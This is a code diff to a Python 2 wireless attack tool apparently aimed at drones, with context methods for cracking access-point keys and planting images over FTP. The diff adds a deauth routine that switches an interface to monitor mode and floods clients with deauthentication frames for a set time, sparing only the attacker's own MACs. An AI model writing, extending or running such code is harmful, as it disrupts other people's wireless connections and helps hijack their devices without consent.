@@ -63,7 +63,7 @@ class Environment:
             return self.accesspoints[index].key
         else:
             print 'Out of bounds! Only ' + len(self.accesspoints) + ' drones found.'
-            
+    
 
     def plantrecoveryimage(self):
         
@@ -74,7 +74,21 @@ class Environment:
             print str(e)
         finally:
             self.__closeftp()
+        
+        
+    def deauth(self, index, duration=20, exceptions=[]):
+        
+        out = commands.getmymacs()
+        mymacs = map(lambda filtered: (filtered.split(' '))[1], [x.strip() for x in filter(lambda line: line, out.split('\n'))])
+        
+        self.__startmonitormode(index)
+        self.__gettargets(index)
+        
+        for x in range(duration):
+            self.__deauthtargets(exceptions + mymacs)
+            time.sleep(1)
             
+        self.__stopmonitormode()
             
     def __getaccesspoints(self, device, ssid):
 
@@ -101,11 +115,14 @@ class Environment:
         return None
     
     
-    def __deauthtargets(self):
+    def __deauthtargets(self, exceptions=[]):
         
         for target in self.targets:
-            print str(target.mac) + ' deauthenticated!'
-            commands.deauth(self.mondevice, target.accesspoint.mac, target.mac)
+            if target.mac not in exceptions:
+                print str(target.mac) + ' deauthenticated!'
+                commands.deauth(self.mondevice, target.accesspoint.mac, target.mac)
+            else:
+                print str(target) + ' skippped!'
     
     
     def __crackpsk(self, index):
@@ -129,7 +146,7 @@ class Environment:
                 else:
                     print 'Handshake found. Crack unsuccessful. Trying again...'
                     
-      
+                    
     def __gettargets(self, index):
         
         accesspoint = self.accesspoints[index]
